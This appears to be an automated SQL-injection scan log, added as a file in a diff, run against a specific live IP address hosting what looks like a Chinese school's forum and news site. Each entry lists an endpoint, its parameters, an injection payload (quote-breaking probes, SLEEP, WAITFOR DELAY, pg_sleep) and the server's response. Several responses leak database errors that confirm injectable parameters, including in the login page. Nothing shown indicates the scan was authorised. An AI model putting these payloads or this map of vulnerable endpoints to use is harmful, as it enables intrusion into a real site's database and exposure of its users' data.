@@ -1,0 +1,584 @@
+Target: http://210.38.207.15/ (GET)
+
+---
+URL:http://210.38.207.15/checkusr.asp (POST)
+VulnName: sqli
+Query: {u'username': u'cntvalue', u'I1': u'\u767b \u9646', u'pwd': u'cntvalue', u'kind': u'A', u'B1': u'\u91cd \u7f6e'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+-----------1:
+ <font face="宋体" size=2>
+<p>Microsoft JET Database Engine</font> <font face="宋体" size=2>错误 '80040e14'</font>
+<p>
+<font face="宋体" size=2>语法错误 (操作符丢失) 在查询表达式 'username='cntvalued'z&quot;0' and pwd='cntvalue'' 中。</font>
+<p>
+<font face="宋体" size=2>/checkusr.asp</font><font face="宋体" size=2>，行 10</font> 
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/userlist.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'action': 'online'}
+Payload: ` or SLEEP(3);-- 
+Advice: use orm
+Database: unknown
+-----------1:
+
+<link rel="stylesheet" href="css/textcss.css" type="text/css">
+<table width="758" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr> 
+    <td height="30" background="images/tapbg.jpg" width="722" class="tc"><img src="images/BMsg.gif" width="16" height="16">信息素养在线学习系统&gt;&gt;&gt;发帖排行&gt;&gt;&gt;</td>
+    <td height="30" background="images/tapbg.jpg" width="36" > 
+      <div align="center"><img src="images/gotop.gif" width="15" height="15" align="absmiddle"></div>
+    </td>
+  </tr>
+</table>
+<table width="758" border="0" align="center" cellpadding="0" cellspacing="1" bgcolor="#003399">
+  <tr bgcolor="#FFFFFF"> 
+    <td height="22" class="bc" width="31"> 
+      <div align="center">标识</div>
+    </td>
+    <td height="22" class="bc" width="133"> 
+      <div align="center">用户名</div>
+    </td>
+    <td height="22" class="bc" width="115"> 
+      <div align="center">主题/回复</div>
+    </td>
+    <td height="22" class="bc" width="47"> 
+      <div align="center">状态</div>
+    </td>
+  </tr>
+</table>
+
+----------------
+---
+---
+URL:http://210.38.207.15/e.aspx (GET)
+VulnName: time delay sqli vuln
+Query: {'vid': '31'}
+Payload: ' or SLEEP(3);-- 
+Advice: use orm
+Database: unknown
+-----------1:
+鍙傛暟涓嶅!
+----------------
+---
+---
+URL:http://210.38.207.15/e.aspx (GET)
+VulnName: time delay sqli vuln
+Query: {'vid': '33'}
+Payload: '));waitfor delay '0:0:3';-- 
+Advice: use orm
+Database: unknown
+-----------1:
+鍙傛暟涓嶅!
+----------------
+---
+---
+URL:http://210.38.207.15/e.aspx (GET)
+VulnName: time delay sqli vuln
+Query: {'vid': '20'}
+Payload: ' or SLEEP(3);-- 
+Advice: use orm
+Database: unknown
+-----------1:
+鍙傛暟涓嶅!
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '3', 'id': '644'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+-----------1:
+ <font face="宋体" size=2>
+<p>Microsoft OLE DB Provider for ODBC Drivers</font> <font face="宋体" size=2>错误 '80040e14'</font>
+<p>
+<font face="宋体" size=2>[Microsoft][ODBC Microsoft Access Driver] 语法错误 (操作符丢失) 在查询表达式 'id=644d'z&quot;0' 中。</font>
+<p>
+<font face="宋体" size=2>/bbs/detail.asp</font><font face="宋体" size=2>，行 6</font> 
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '4', 'id': '655'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+-----------1:
+ <font face="宋体" size=2>
+<p>Microsoft OLE DB Provider for ODBC Drivers</font> <font face="宋体" size=2>错误 '80040e14'</font>
+<p>
+<font face="宋体" size=2>[Microsoft][ODBC Microsoft Access Driver] 语法错误 (操作符丢失) 在查询表达式 'id=655d'z&quot;0' 中。</font>
+<p>
+<font face="宋体" size=2>/bbs/detail.asp</font><font face="宋体" size=2>，行 6</font> 
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '5', 'id': '656'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+-----------1:
+ <font face="宋体" size=2>
+<p>Microsoft OLE DB Provider for ODBC Drivers</font> <font face="宋体" size=2>错误 '80040e14'</font>
+<p>
+<font face="宋体" size=2>[Microsoft][ODBC Microsoft Access Driver] 语法错误 (操作符丢失) 在查询表达式 'id=656d'z&quot;0' 中。</font>
+<p>
+<font face="宋体" size=2>/bbs/detail.asp</font><font face="宋体" size=2>，行 6</font> 
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '6', 'id': '580'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+-----------1:
+ <font face="宋体" size=2>
+<p>Microsoft OLE DB Provider for ODBC Drivers</font> <font face="宋体" size=2>错误 '80040e14'</font>
+<p>
+<font face="宋体" size=2>[Microsoft][ODBC Microsoft Access Driver] 语法错误 (操作符丢失) 在查询表达式 'id=580d'z&quot;0' 中。</font>
+<p>
+<font face="宋体" size=2>/bbs/detail.asp</font><font face="宋体" size=2>，行 6</font> 
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/topic.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'action': 'new'}
+Payload: );waitfor delay '0:0:3';-- 
+Advice: use orm
+Database: unknown
+-----------1:
+
+<html>
+<head>
+<title></title>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<link rel="stylesheet" href="css/textcss.css" type="text/css">
+</head>
+<body>
+<br>
+<table width="758" height="30" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr> 
+    <td background="images/tapbg.jpg" height="30" class="tc"><img src="images/nofollow.gif" width="15" height="15">信息素养在线学习系统&gt;&gt;&gt;热帖排行&gt;&gt;&gt;</td>
+  </tr>
+</table>
+<table width="758" border="0" align="center" cellpadding="0" cellspacing="0" class="tapname">
+  <tr> 
+    <td width="316" height="21" class="bc"> 
+      <div align="center">标题</div>
+    </td>
+    <td width="121" height="21" class="bc"> 
+      <div align="center">作者</div>
+    </td>
+    <td width="74" height="21" class="bc"> 
+      <div align="center">点击</div>
+    </td>
+    <td width="240" height="21" class="bc"> 
+      <div align="center">发表时间</div>
+    </td>
+  </tr>
+</table>
+
+</body>
+</html>
+
+
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '7', 'id': '375'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+-----------1:
+ <font face="宋体" size=2>
+<p>Microsoft OLE DB Provider for ODBC Drivers</font> <font face="宋体" size=2>错误 '80040e14'</font>
+<p>
+<font face="宋体" size=2>[Microsoft][ODBC Microsoft Access Driver] 语法错误 (操作符丢失) 在查询表达式 'id=375d'z&quot;0' 中。</font>
+<p>
+<font face="宋体" size=2>/bbs/detail.asp</font><font face="宋体" size=2>，行 6</font> 
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/disuser.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'name': '14106013047'}
+Payload:  or pg_sleep(3)
+Advice: use orm
+Database: unknown
+-----------1:
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<HTML><HEAD><TITLE>无法找到该页</TITLE>
+<META HTTP-EQUIV="Content-Type" Content="text/html; charset=GB2312">
+<STYLE type="text/css">
+  BODY { font: 9pt/12pt 宋体 }
+  H1 { font: 12pt/15pt 宋体 }
+  H2 { font: 9pt/12pt 宋体 }
+  A:link { color: red }
+  A:visited { color: maroon }
+</STYLE>
+</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>
+
+<h1>无法找到该页</h1>
+您正在搜索的页面可能已经删除、更名或暂时不可用。
+<hr>
+<p>请尝试以下操作：</p>
+<ul>
+<li>确保浏览器的地址栏中显示的网站地址的拼写和格式正确无误。</li>
+<li>如果通过单击链接而到达了该网页，请与网站管理员联系，通知他们该链接的格式不正确。
+</li>
+<li>单击<a href="javascript:history.back(1)">后退</a>按钮尝试另一个链接。</li>
+</ul>
+<h2>HTTP 错误 404 - 文件或目录未找到。<br>Internet 信息服务 (IIS)</h2>
+<hr>
+<p>技术信息（为技术支持人员提供）</p>
+<ul>
+<li>转到 <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft 产品支持服务</a>并搜索包括&ldquo;HTTP&rdquo;和&ldquo;404&rdquo;的标题。</li>
+<li>打开&ldquo;IIS 帮助&rdquo;（可在 IIS 管理器 (inetmgr) 中访问），然后搜索标题为&ldquo;网站设置&rdquo;、&ldquo;常规管理任务&rdquo;和&ldquo;关于自定义错误消息&rdquo;的主题。</li>
+</ul>
+
+</TD></TR></TABLE></BODY></HTML>
+
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '4', 'id': '654'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+-----------1:
+ <font face="宋体" size=2>
+<p>Microsoft OLE DB Provider for ODBC Drivers</font> <font face="宋体" size=2>错误 '80040e14'</font>
+<p>
+<font face="宋体" size=2>[Microsoft][ODBC Microsoft Access Driver] 语法错误 (操作符丢失) 在查询表达式 'id=654d'z&quot;0' 中。</font>
+<p>
+<font face="宋体" size=2>/bbs/detail.asp</font><font face="宋体" size=2>，行 6</font> 
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '4', 'id': '653'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+-----------1:
+ <font face="宋体" size=2>
+<p>Microsoft OLE DB Provider for ODBC Drivers</font> <font face="宋体" size=2>错误 '80040e14'</font>
+<p>
+<font face="宋体" size=2>[Microsoft][ODBC Microsoft Access Driver] 语法错误 (操作符丢失) 在查询表达式 'id=653d'z&quot;0' 中。</font>
+<p>
+<font face="宋体" size=2>/bbs/detail.asp</font><font face="宋体" size=2>，行 6</font> 
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/disuser.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'name': '13113022012'}
+Payload:  or SLEEP(3);-- 
+Advice: use orm
+Database: unknown
+-----------1:
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<HTML><HEAD><TITLE>无法找到该页</TITLE>
+<META HTTP-EQUIV="Content-Type" Content="text/html; charset=GB2312">
+<STYLE type="text/css">
+  BODY { font: 9pt/12pt 宋体 }
+  H1 { font: 12pt/15pt 宋体 }
+  H2 { font: 9pt/12pt 宋体 }
+  A:link { color: red }
+  A:visited { color: maroon }
+</STYLE>
+</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>
+
+<h1>无法找到该页</h1>
+您正在搜索的页面可能已经删除、更名或暂时不可用。
+<hr>
+<p>请尝试以下操作：</p>
+<ul>
+<li>确保浏览器的地址栏中显示的网站地址的拼写和格式正确无误。</li>
+<li>如果通过单击链接而到达了该网页，请与网站管理员联系，通知他们该链接的格式不正确。
+</li>
+<li>单击<a href="javascript:history.back(1)">后退</a>按钮尝试另一个链接。</li>
+</ul>
+<h2>HTTP 错误 404 - 文件或目录未找到。<br>Internet 信息服务 (IIS)</h2>
+<hr>
+<p>技术信息（为技术支持人员提供）</p>
+<ul>
+<li>转到 <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft 产品支持服务</a>并搜索包括&ldquo;HTTP&rdquo;和&ldquo;404&rdquo;的标题。</li>
+<li>打开&ldquo;IIS 帮助&rdquo;（可在 IIS 管理器 (inetmgr) 中访问），然后搜索标题为&ldquo;网站设置&rdquo;、&ldquo;常规管理任务&rdquo;和&ldquo;关于自定义错误消息&rdquo;的主题。</li>
+</ul>
+
+</TD></TR></TABLE></BODY></HTML>
+
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '4', 'id': '652'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+-----------1:
+ <font face="宋体" size=2>
+<p>Microsoft OLE DB Provider for ODBC Drivers</font> <font face="宋体" size=2>错误 '80040e14'</font>
+<p>
+<font face="宋体" size=2>[Microsoft][ODBC Microsoft Access Driver] 语法错误 (操作符丢失) 在查询表达式 'id=652d'z&quot;0' 中。</font>
+<p>
+<font face="宋体" size=2>/bbs/detail.asp</font><font face="宋体" size=2>，行 6</font> 
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/detail.asp (GET)
+VulnName: sqli
+Query: {'boardid': '4', 'id': '651'}
+Payload: d'z"0
+Advice: use orm
+Database: Microsoft SQL database
+-----------1:
+ <font face="宋体" size=2>
+<p>Microsoft OLE DB Provider for ODBC Drivers</font> <font face="宋体" size=2>错误 '80040e14'</font>
+<p>
+<font face="宋体" size=2>[Microsoft][ODBC Microsoft Access Driver] 语法错误 (操作符丢失) 在查询表达式 'id=651d'z&quot;0' 中。</font>
+<p>
+<font face="宋体" size=2>/bbs/detail.asp</font><font face="宋体" size=2>，行 6</font> 
+----------------
+---
+---
+URL:http://210.38.207.15/news/show.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'id': '187'}
+Payload: ` or SLEEP(3);-- 
+Advice: use orm
+Database: unknown
+-----------1:
+<script language='javascript'>alert('对不起，不可以包含特殊字符！');history.back();</script>
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/minfo.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'user': '\xd3\xce\xbf\xcd'}
+Payload: );waitfor delay '0:0:3';-- 
+Advice: use orm
+Database: unknown
+-----------1:
+ 
+<html>
+<link rel="stylesheet" href="css/textcss.css" type="text/css">
+
+<br>
+<table width="758" border="0" cellspacing="0" cellpadding="0" align="center" class="tapname">
+  <tr> 
+    <td height="28" colspan="2" bgcolor="#0099ff"><img src="images/BMsg.gif" width="16" height="16" align="absmiddle"><span class="tc">信息素养在线学习系统→浏览个人资料</span></td>
+    <td height="28" width="322" bgcolor="#0099ff">&nbsp;</td>
+    <td height="28" width="42" bgcolor="#0099ff"> 
+      <div align="center"><img src="images/gotop.gif" width="15" height="15"></div>
+    </td>
+  </tr>
+  <tr> 
+    <td height="29" colspan="2"><img src="images/banzhu.gif" width="19" height="17" align="absmiddle"><font color="#FF0000"><span class="bc"><font color="#000000">的个人资料</font></span></font></td>
+    <td height="29" colspan="2"> 
+      <div align="right"><img src="images/stats.gif" width="16" height="16" align="absmiddle"><span class="bc">当前状态： 
+        [离线]
+        </span></div>
+    </td>
+  </tr>
+  <tr> 
+    <td height="29" width="122" class="bc"> 
+      <div align="right">学号：</div>
+    </td>
+    <td height="29" width="274" class="bc"></td>
+    <td height="29" colspan="2">&nbsp;</td>
+  </tr>
+  <tr> 
+    <td height="29" width="122" class="bc"> 
+      <div align="right">姓名：</div>
+    </td>
+    <td height="29" width="274" class="bc"></td>
+    <td height="29" colspan="2">&nbsp;</td>
+  </tr>
+  <tr> 
+    <td height="29" width="122" class="bc"> 
+      <div align="right">E-mail:</div>
+    </td>
+    <td height="29" width="274" class="bc"></td>
+    <td height="29" colspan="2">&nbsp;</td>
+  </tr>
+  <tr> 
+    <td height="29" width="122" class="bc"> 
+      <div align="right">年级：</div>
+    </td>
+    <td height="29" width="274" class="bc"></td>
+    <td height="29" colspan="2">&nbsp;</td>
+  </tr>
+  <tr> 
+    <td height="29" width="122" class="bc"> 
+      <div align="right">班级：</div>
+    </td>
+    <td height="29" width="274" class="bc"></td>
+    <td height="29" colspan="2"> 
+      <div align="right"> </div>
+    </td>
+  </tr>
+</table>
+<br>
+<table width="758" border="0" align="center" bordercolor="#F5F5F5" cellpadding="0" cellspacing="0" class="tapname">
+  <tr> 
+    <td height="28" colspan="4" bgcolor="#0099ff"><b class="tc"><img src="images/nofollow.gif" width="15" height="15">论坛属性：</b></td>
+  </tr>
+  <tr> 
+    <td height="35" width="119" class="bc">&nbsp;</td>
+    <td height="50" rowspan="3" width="276" class="bc"><font color="#FF0000"><img src=images/ico/.gif border="0"></font></td>
+    <td height="35" width="124" class="bc">&nbsp;</td>
+    <td height="35" width="227" class="bc">&nbsp;</td>
+  </tr>
+  <tr> 
+    <td height="18" width="119" class="bc"> 
+      <div align="right">个性头像：</div>
+    </td>
+    <td height="18" width="124" class="bc"> 
+      <div align="right">等级：</div>
+    </td>
+    <td height="18" width="227" class="bc"> 
+      凡人
+    </td>
+  </tr>
+  <tr> 
+    <td height="3" width="119" class="bc"></td>
+    <td height="3" width="124" class="bc"> 
+      <div align="right">注册时间：</div>
+    </td>
+    <td height="3" width="227" class="bc"></td>
+  </tr>
+  <tr> 
+    <td height="25" width="119" class="bc"> 
+      <div align="right">经验值：</div>
+    </td>
+    <td height="25" width="276" class="bc"></td>
+    <td height="25" width="124" class="bc"> 
+      <div align="right">主题文章：</div>
+    </td>
+    <td height="25" width="227" class="bc"> 
+      0
+      篇</td>
+  </tr>
+  <tr> 
+    <td height="25" bgcolor="#F5F5F5" width="119" class="bc"> 
+      <div align="right">星级：</div>
+    </td>
+    <td height="25" bgcolor="#F5F5F5" width="276" class="bc"> 
+      <font color=red>☆</font>☆☆☆☆☆<font color=red>☆☆</font>☆☆☆☆<font color=red>☆☆☆</font>☆☆☆<font color=red>☆☆☆☆</font>☆☆<font color=red>☆☆☆☆☆</font>☆<font color=red>☆☆☆☆☆☆</font>
+    </td>
+    <td height="25" bgcolor="#F5F5F5" width="124" class="bc"> 
+      <div align="right">回复文章：</div>
+    </td>
+    <td height="25" bgcolor="#F5F5F5" width="227" class="bc"> 
+      0
+      篇</td>
+  </tr>
+</table>
+
+----------------
+---
+---
+URL:http://210.38.207.15/news/show.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'id': '189'}
+Payload: ;waitfor delay '0:0:3';-- 
+Advice: use orm
+Database: unknown
+-----------1:
+<script language='javascript'>alert('对不起，不可以包含特殊字符！');history.back();</script>
+----------------
+---
+---
+URL:http://210.38.207.15/bbs/disuser.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'name': '14106016058'}
+Payload: ';waitfor delay '0:0:3';-- 
+Advice: use orm
+Database: unknown
+-----------1:
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<HTML><HEAD><TITLE>无法找到该页</TITLE>
+<META HTTP-EQUIV="Content-Type" Content="text/html; charset=GB2312">
+<STYLE type="text/css">
+  BODY { font: 9pt/12pt 宋体 }
+  H1 { font: 12pt/15pt 宋体 }
+  H2 { font: 9pt/12pt 宋体 }
+  A:link { color: red }
+  A:visited { color: maroon }
+</STYLE>
+</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>
+
+<h1>无法找到该页</h1>
+您正在搜索的页面可能已经删除、更名或暂时不可用。
+<hr>
+<p>请尝试以下操作：</p>
+<ul>
+<li>确保浏览器的地址栏中显示的网站地址的拼写和格式正确无误。</li>
+<li>如果通过单击链接而到达了该网页，请与网站管理员联系，通知他们该链接的格式不正确。
+</li>
+<li>单击<a href="javascript:history.back(1)">后退</a>按钮尝试另一个链接。</li>
+</ul>
+<h2>HTTP 错误 404 - 文件或目录未找到。<br>Internet 信息服务 (IIS)</h2>
+<hr>
+<p>技术信息（为技术支持人员提供）</p>
+<ul>
+<li>转到 <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft 产品支持服务</a>并搜索包括&ldquo;HTTP&rdquo;和&ldquo;404&rdquo;的标题。</li>
+<li>打开&ldquo;IIS 帮助&rdquo;（可在 IIS 管理器 (inetmgr) 中访问），然后搜索标题为&ldquo;网站设置&rdquo;、&ldquo;常规管理任务&rdquo;和&ldquo;关于自定义错误消息&rdquo;的主题。</li>
+</ul>
+
+</TD></TR></TABLE></BODY></HTML>
+
+----------------
+---
+---
+URL:http://210.38.207.15/news/show.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'id': '194'}
+Payload:  or SLEEP(3);-- 
+Advice: use orm
+Database: unknown
+-----------1:
+<script language='javascript'>alert('对不起，不可以包含特殊字符！');history.back();</script>
+----------------
+---
+---
+URL:http://210.38.207.15/news/show.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'id': '194', 'Page': '1'}
+Payload:  or pg_sleep(3)
+Advice: use orm
+Database: unknown
+-----------1:
+<Script Language=JavaScript>alert('传参错误！参数  的值中包含非法字符串！\n\n请不要在参数中出现：and update delete ; insert mid master 等非法字符！');window.close();</Script>
+----------------
+---
+---
+URL:http://210.38.207.15/news/show.asp (GET)
+VulnName: time delay sqli vuln
+Query: {'id': '193'}
+Payload: ');waitfor delay '0:0:3';-- 
+Advice: use orm
+Database: unknown
+-----------1:
+<script language='javascript'>alert('对不起，不可以包含特殊字符！');history.back();</script>
+----------------
+---
